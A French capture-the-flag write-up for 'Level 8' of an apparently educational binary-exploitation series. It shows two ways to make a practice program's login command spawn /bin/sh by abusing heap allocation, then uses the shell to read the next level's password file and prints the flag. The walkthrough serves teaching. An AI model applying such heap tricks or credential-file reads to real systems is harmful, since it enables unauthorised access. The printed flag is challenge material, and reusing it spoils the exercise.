# Level 8

Lors de la décompilation du binaire, on peut voir qu'il y a un appel à la fonction `system` pour exécuter la commande `/bin/sh`.  
Le programme répète en boucle la lecture de commande `auth`, `reset`, `service` `login` et l'affichage des adresse de la variable `auth` et `service`.

Pour pouvoir exécuter la fonction `system`, la valeur de l'adresse `auth + 32` doit être différente de `0`. L'objectif de notre exploit sera de chercher à écrire dans `auth->number`, en profitant du `strdup` de la commande `service`. L'exploitation est d'autant plus facile que les adresses mémoires des variables `auth` et `service` nous sont données à chaque tour de boucle.  
Pour cela nous avons plusieurs méthodes différentes. L'attribution des adresses mémoires est statique : si nous exécutons la commande `auth a` la variable `auth` aura toujours cette adresse `0x804a008` donc l'adresse `0x804A028` ne devra pas être `null`.

## Solution 1
Faire deux appels successifs à `service` :
```shell
~ ./level8
(nil), (nil)
auth a
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$
```

## Solution 2
Écrire directement un grand nombre de caractères (quinze suffisent) en un seul appel à `service` :
```shell
~ ./level8
(nil), (nil)
auth a
0x804a008, (nil)
service aaaaaaaaaaaaaaa
0x804a008, 0x804a018
login
$
```

Il ne nous reste plus qu'à récupérer le `pass` du niveau suivant.
```shell
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```